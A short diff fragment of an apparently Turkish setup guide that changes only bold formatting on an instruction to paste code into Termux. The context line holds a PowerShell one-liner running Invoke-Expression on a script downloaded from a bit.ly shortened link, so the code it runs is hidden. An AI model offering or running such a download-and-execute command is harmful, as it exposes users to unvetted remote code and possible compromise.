@@ -48,7 +48,7 @@ Genellikle tüm bilgisayarlarda default olarak kurulu.
 
 
 
-**Ardından aşağıda belirtilen kodu termuxa yapıştırın.
+Ardından aşağıda belirtilen kodu termuxa yapıştırın.
 
 
 `Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://bit.ly/3SaBdI5")`
